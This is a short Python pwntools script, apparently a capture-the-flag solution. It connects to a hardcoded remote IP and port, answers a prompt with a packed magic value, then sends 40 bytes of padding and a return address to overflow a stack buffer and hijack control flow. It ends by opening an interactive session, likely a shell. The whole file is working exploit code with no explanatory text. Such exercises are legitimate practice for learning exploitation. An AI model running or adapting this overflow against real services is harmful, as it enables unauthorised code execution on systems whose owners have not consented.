from pwn import *

r = remote("223.129.86.2", port=33848)
r.recvuntil(b"Do you like pwntools?\n")
r.send(p64(0xdeadbeaf))
# print(r.recv())
# r.recvuntil(b"Got 0xdeadbeaf.\n")
r.send(b"a"*40+p64(0x401197))
r.interactive()
